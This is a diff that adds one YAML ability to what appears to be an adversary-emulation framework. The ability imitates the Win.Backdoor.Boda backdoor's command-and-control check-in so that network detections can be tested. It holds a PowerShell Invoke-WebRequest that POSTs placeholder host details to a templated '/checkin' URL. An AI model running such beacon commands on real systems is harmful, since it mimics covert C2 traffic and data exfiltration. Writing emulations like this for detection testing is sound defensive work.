@@ -1,0 +1,38 @@
+- tactic: command-and-control
+  technique_name: 'Application Layer Protocol: Web Protocols'
+  technique_id: T1071.001
+  name: 'Intrusion: Win.Backdoor.Boda malware checkin'
+  description: "Adversaries leveraging the SID:1-26842 MALWARE-BACKDOOR Win.Backdoor.Boda\
+    \ malware can use it to establish persistent, covert access to a compromised system.\
+    \ Once installed, the backdoor facilitates remote command-and-control (C2) communication,\
+    \ enabling attackers to exfiltrate sensitive data, deploy additional malicious\
+    \ payloads, move laterally across networks, or manipulate system functions for\
+    \ espionage or further exploitation. Its check-in behavior indicates it may be\
+    \ used for reconnaissance or to maintain a heartbeat with the attacker\u2019s\
+    \ infrastructure, ensuring ongoing control over the infected host."
+  executors:
+  - name: psh
+    platform: windows
+    command: Invoke-WebRequest -Uri "#{ignite.url}/checkin" -Method POST -Body "macName=Test&macOS=11.6.1&macMac=00:11:22:33:44:55"
+      -ContentType "application/x-www-form-urlencoded"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 10
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - command-and-control
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 712b0747-20c1-4656-a89c-775f4bdab905
